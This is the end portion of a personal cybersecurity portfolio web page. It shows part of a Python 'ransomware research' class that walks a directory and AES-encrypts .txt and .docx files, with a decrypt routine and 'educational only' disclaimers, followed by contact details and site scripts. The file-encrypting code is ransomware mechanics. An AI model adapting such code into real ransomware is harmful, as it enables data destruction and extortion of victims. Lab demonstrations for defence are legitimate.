        <span class="string">"""Walk through directory and encrypt target files."""</span>
        <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="keyword">self</span>.target_dir):
            <span class="keyword">for</span> file <span class="keyword">in</span> files:
                <span class="keyword">if</span> file.endswith(<span class="string">'.txt'</span>) <span class="keyword">or</span> file.endswith(<span class="string">'.docx'</span>):
                    <span class="keyword">self</span>.encrypt_file(os.path.join(root, file))
                    print(<span class="string">f"[+] Encrypted: {file}"</span>)
    
    <span class="keyword">def</span> <span class="function">generate_detection_metrics</span>(self):
        <span class="string">"""Log metrics for detection research."""</span>
        metrics = {
            <span class="string">"encryption_algorithm"</span>: <span class="string">"AES-256-CBC"</span>,
            <span class="string">"file_types_targeted"</span>: [<span class="string">".txt"</span>, <span class="string">".docx"</span>],
            <span class="string">"key_size"</span>: <span class="number">256</span>,
            <span class="string">"detection_evasion"</span>: <span class="string">"False — Lab use only"</span>
        }
        <span class="keyword">with</span> open(<span class="string">'ransomware_metrics.json'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:
            json.dump(metrics, f, indent=<span class="number">4</span>)
        print(<span class="string">"[+] Detection metrics saved."</span>)
    
    <span class="keyword">def</span> <span class="function">decrypt_file</span>(self, encrypted_path: str) -> bool:
        <span class="string">"""Decrypt a file using the stored key (research)."""</span>
        <span class="keyword">try</span>:
            <span class="keyword">with</span> open(encrypted_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:
                iv = f.read(<span class="number">16</span>)
                ciphertext = f.read()
            
            cipher = AES.new(<span class="keyword">self</span>.key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            
            <span class="comment"># Restore original filename</span>
            original_path = encrypted_path.replace(<span class="string">'.encrypted'</span>, <span class="string">''</span>)
            <span class="keyword">with</span> open(original_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:
                f.write(plaintext)
            os.remove(encrypted_path)
            <span class="keyword">return</span> <span class="keyword">True</span>
        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
            print(<span class="string">f"[-] Error decrypting: {e}"</span>)
            <span class="keyword">return</span> <span class="keyword">False</span>

<span class="comment"># =============================================================================</span>
<span class="comment"># LAB ENTRY POINT</span>
<span class="comment"># =============================================================================</span>

<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
    print(<span class="string">"="</span> * <span class="number">60</span>)
    print(<span class="string">"🔬 RANSOMWARE RESEARCH LAB — EDUCATIONAL USE ONLY"</span>)
    print(<span class="string">"="</span> * <span class="number">60</span>)
    
    <span class="comment"># Initialize research environment</span>
    lab = RansomwareResearch(target_dir=<span class="string">"./lab_files"</span>)
    lab.generate_key()
    
    <span class="comment"># Run simulation</span>
    print(<span class="string">"[+] Starting encryption simulation..."</span>)
    lab.traverse_directory()
    lab.generate_detection_metrics()
    
    print(<span class="string">"\n[✓] Simulation complete. All files encrypted in lab environment."</span>)
    print(<span class="string">"[✓] Key stored for decryption research."</span>)
    print(<span class="string">"\n📊 Metrics saved to: ransomware_metrics.json"</span>)
    print(<span class="string">"\n💡 This is for EDUCATIONAL purposes only."</span>)
    print(<span class="string">"   Used to understand ransomware mechanics for defense."</span>)</pre>
            </div>

            <div style="margin-top:1.5rem; display:flex; gap:0.75rem; flex-wrap:wrap;">
                <span style="background:var(--bg-surface);padding:0.3rem 1rem;border-radius:6px;font-size:0.7rem;border:1px solid var(--border-subtle);font-family:var(--font-mono);">🔐 AES-256-CBC</span>
                <span style="background:var(--bg-surface);padding:0.3rem 1rem;border-radius:6px;font-size:0.7rem;border:1px solid var(--border-subtle);font-family:var(--font-mono);">📁 File Traversal</span>
                <span style="background:var(--bg-surface);padding:0.3rem 1rem;border-radius:6px;font-size:0.7rem;border:1px solid var(--border-subtle);font-family:var(--font-mono);">📊 Detection Metrics</span>
                <span style="background:var(--bg-surface);padding:0.3rem 1rem;border-radius:6px;font-size:0.7rem;border:1px solid var(--border-subtle);font-family:var(--font-mono);">⚡ Educational Only</span>
            </div>

            <div style="margin-top:1rem; padding:1rem; background:var(--accent-red);border-radius:8px; border-left:4px solid #ff5f57; color:var(--bg-primary); font-size:0.8rem;">
                <strong>⚠️ IMPORTANT:</strong> This code is for <strong>EDUCATIONAL PURPOSES ONLY</strong> and is designed to run in an isolated lab environment. Never use this on production systems or without explicit authorization.
            </div>
        </div>
    </section>

    <!-- ============================================================
    CONTACT
    ============================================================ -->
    <section class="contact-section section-padding" id="contact">
        <div class="container">
            <span class="section-label">✦ Connect</span>
            <h2 class="section-title">Let's Build Something</h2>
            <p class="section-subtitle">
                Have a project in mind? Need a security audit? Or just want to 
                geek out about networking? Reach out.
            </p>

            <div class="contact-grid">
                <div class="contact-info">
                    <h3>Joseph Chitalu</h3>
                    <p>Cybersecurity Engineer · Network Architect · Full-Stack Developer</p>

                    <a href="mailto:josephchitalu2@gmail.com" class="contact-item">
                        📧 josephchitalu2@gmail.com
                    </a>
                    <a href="tel:+260970408074" class="contact-item">
                        📱 +260 970 408 074
                    </a>
                    <a href="https://github.com/josephchitalu2" target="_blank" class="contact-item">
                        🐙 github.com/josephchitalu2
                    </a>
                    <a href="#" class="contact-item">
                        🔗 linkedin.com/in/josephchitalu
                    </a>
                    <a href="#" class="contact-item">
                        🐦 @joseph_sec
                    </a>

                    <div style="margin-top:1.5rem; padding-top:1.5rem; border-top:1px solid var(--border-subtle);">
                        <p style="font-size:0.8rem; color:var(--text-muted);">
                            ⚡ Currently pursuing <strong style="color:var(--text-primary);">CCNP Security</strong> · 
                            Available for freelance &amp; full-time roles
                        </p>
                        <span class="availability-badge">
                            📍 Zambia (GMT+2) · Available worldwide
                        </span>
                    </div>
                </div>

                <form class="contact-form" id="contactForm">
                    <input type="text" placeholder="Your Name" required />
                    <input type="email" placeholder="your@email.com" required />
                    <input type="text" placeholder="Subject" />
                    <textarea placeholder="Tell me about your project or security challenge..." required></textarea>
                    <button type="submit" class="btn btn-primary" style="width:100%; justify-content:center; font-size:0.9rem;">
                        Send Message ✦
                    </button>
                </form>
            </div>
        </div>
    </section>

    <!-- ============================================================
    FOOTER
    ============================================================ -->
    <footer class="footer">
        <div class="container">
            <p>
                © 2026 <span style="color:var(--accent-teal);">Joseph Chitalu</span> — 
                Built with <span style="color:var(--accent-teal);">♥</span> and 
                <span style="font-family:var(--font-mono);">100%</span> dark mode
            </p>
            <div class="footer-links">
                <a href="#home">Home</a>
                <a href="#services">Services</a>
                <a href="#skills">Skills</a>
                <a href="#projects">Projects</a>
                <a href="#code">Code</a>
                <a href="#contact">Contact</a>
            </div>
        </div>
    </footer>

    <!-- ============================================================
    JAVASCRIPT
    ============================================================ -->
    <script>
        (function() {
            'use strict';

            // ============================================================
            // MOBILE MENU
            // ============================================================
            const menuToggle = document.getElementById('menuToggle');
            const navLinks = document.getElementById('navLinks');

            if (menuToggle) {
                menuToggle.addEventListener('click', function() {
                    this.classList.toggle('active');
                    navLinks.classList.toggle('open');
                });
            }

            navLinks.querySelectorAll('a').forEach(link => {
                link.addEventListener('click', function() {
                    menuToggle.classList.remove('active');
                    navLinks.classList.remove('open');
                });
            });

            // ============================================================
            // SMOOTH SCROLL
            // ============================================================
            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                anchor.addEventListener('click', function(e) {
                    const targetId = this.getAttribute('href');
                    if (targetId === '#') return;
                    const target = document.querySelector(targetId);
                    if (target) {
                        e.preventDefault();
                        const navHeight = document.querySelector('.navbar').offsetHeight;
                        const targetPosition = target.getBoundingClientRect().top + window.pageYOffset - navHeight;
                        window.scrollTo({
                            top: targetPosition,
                            behavior: 'smooth'
                        });
                    }
                });
            });

            // ============================================================
            // CONTACT FORM
            // ============================================================
            const contactForm = document.getElementById('contactForm');
            if (contactForm) {
                contactForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    alert('✅ Thank you for your message! Joseph will get back to you soon.');
                    this.reset();
                });
            }

            // ============================================================
            // ACTIVE NAV LINK ON SCROLL
            // ============================================================
            const sections = document.querySelectorAll('section[id]');
            const navLinksAll = document.querySelectorAll('.nav-links a:not(.nav-cta)');

            window.addEventListener('scroll', function() {
                let current = '';
                sections.forEach(section => {
                    const sectionTop = section.offsetTop - 100;
                    if (window.scrollY >= sectionTop) {
                        current = section.getAttribute('id');
                    }
                });

                navLinksAll.forEach(link => {
                    link.style.color = 'var(--text-secondary)';
                    if (link.getAttribute('href') === '#' + current) {
                        link.style.color = 'var(--text-highlight)';
                    }
                });
            });

            // ============================================================
            // INTERSECTION OBSERVER (Fade-in)
            // ============================================================
            const cards = document.querySelectorAll('.skill-card, .project-card, .service-card');

            if ('IntersectionObserver' in window) {
                const observer = new IntersectionObserver((entries) => {
                    entries.forEach(entry => {
                        if (entry.isIntersecting) {
                            entry.target.style.opacity = '1';
                            entry.target.style.transform = 'translateY(0)';
                        }
                    });
                }, { threshold: 0.1 });

                cards.forEach(card => {
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(30px)';
                    card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                    observer.observe(card);
                });
            } else {
                cards.forEach(card => {
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                });
            }

        })();
    </script>

</body>
</html>
